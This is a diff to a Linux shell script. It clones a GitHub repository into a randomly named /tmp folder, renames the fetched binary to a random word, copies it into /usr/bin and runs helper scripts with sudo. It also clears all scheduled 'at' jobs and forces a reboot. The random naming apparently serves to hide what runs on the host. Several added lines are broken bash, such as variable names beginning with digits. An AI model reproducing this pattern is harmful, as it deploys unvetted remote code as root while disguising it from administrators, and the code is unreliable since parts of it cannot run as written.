@@ -9,9 +9,16 @@ echo 'sudo reboot -f' | at now + 12 hours
 
 apt -y install gpw
 
-timer=$(gpw 1 12)
-tmpfoldername=$(gpw 1 12)
-softwarename=$(gpw 1 12)
+timer=$(gpw 1 11)
+tmpfoldername=$(gpw 1 7)
+softwarename=$(gpw 1 9)
+
+1x=$(gpw 1 2)
+2x=$(gpw 1 4)
+3x=$(gpw 1 6)
+4x=$(gpw 1 8)
+5x=$(gpw 1 10)
+6x=$(gpw 1 12)
 
 #rm -rf /tmp/defaultsoft/
 for i in `atq | awk '{print $1}'`;do atrm $i;done
@@ -23,22 +30,23 @@ sleep 2
 cd /tmp && mkdir $tmpfoldername
 git clone https://github.com/tokdok/default.git /tmp/$tmpfoldername
 cd /tmp/$tmpfoldername
-mv /tmp/$tmpfoldername/defaultsoftwarename /tmp/$tmpfoldername/$softwarename
+mv /tmp/$tmpfoldername/soft /tmp/$tmpfoldername/$softwarename
 chmod +x /tmp/$tmpfoldername/$softwarename
 chmod 777 ./*.sh
 cp /tmp/$tmpfoldername/$softwarename /usr/bin/
 sleep 3
 
 
+
 sudo apt-get install dos2unix
 
 sudo dos2unix defaulttimer.sh
-sudo dos2unix 4.sh
-sudo dos2unix 2.sh
-sudo dos2unix 5.sh
-sudo dos2unix 3.sh
-sudo dos2unix 6.sh
-sudo dos2unix 1.sh
+sudo dos2unix $4x.sh
+sudo dos2unix $2x.sh
+sudo dos2unix $5x.sh
+sudo dos2unix $3x.sh
+sudo dos2unix $6x.sh
+sudo dos2unix $1x.sh
 
 sudo ./defaulttimer.sh & ./defaultchecker.sh
 
